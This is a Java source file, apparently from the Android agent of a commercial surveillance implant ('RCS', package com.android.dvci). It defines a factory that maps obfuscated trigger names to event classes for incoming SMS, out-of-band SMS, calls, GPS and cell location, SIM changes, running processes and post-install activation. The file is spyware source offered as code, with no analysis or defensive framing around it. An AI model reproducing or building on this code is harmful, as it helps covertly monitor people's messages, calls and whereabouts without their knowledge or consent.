/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.event;

import com.android.dvci.auto.Cfg;
import com.android.dvci.interfaces.AbstractFactory;
import com.android.dvci.util.Check;
import com.android.mm.M;

public class FactoryEvent implements AbstractFactory<BaseEvent, String> {
	private static final String TAG = "EventFactory"; //$NON-NLS-1$

	public BaseEvent create(String type, String subtype) {
		BaseEvent e = new NullEvent();
		
		if (M.e("timer").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			if (M.e("loop").equals(subtype)) { //$NON-NLS-1$
				e = new EventLoop();
			} else {
				e = new EventTimer();
			}
		} else if (M.e("date").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventDate();
		} else if (M.e("afterinst").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventAfterinst();
		} else if (M.e("sms").equals(type)) { //$NON-NLS-1$

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_SMS");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventSms();
		} else if (M.e("oob").equals(type)) { //$NON-NLS-1$

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_OOB");//$NON-NLS-1$ //$NON-NLS-2$
			}

			e = new EventOOBSms();
		} else if (M.e("call").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_CALL");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventCall();
		} else if (M.e("connection").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_CONNECTION");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventConnectivity();
		} else if (M.e("process").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_PROCESS");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventProcess();
		} else if (M.e("position cell").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_CELLID");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventCellId();
		} else if (M.e("quota").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_QUOTA");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventQuota();
		} else if (M.e("sim").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_SIM_CHANGE");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventSim();
		} else if (M.e("position gps").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_LOCATION");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventLocation();
		} else if (M.e("ac").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_AC");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventAc();
		} else if (M.e("battery").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_BATTERY");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventBattery();
		} else if (M.e("standby").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_STANDBY");//$NON-NLS-1$ //$NON-NLS-2$
			}
			
			e = new EventStandby();
		} else if (M.e("poweroff").equals(type)) { //$NON-NLS-1$

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_POWEROFF");//$NON-NLS-1$ //$NON-NLS-2$
			}

			e = new EventPowerOff();
		}else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + "Unknown: " + type);//$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		if (e != null) {
			e.setSubType(subtype);
		}
		
		return e;
	}

}
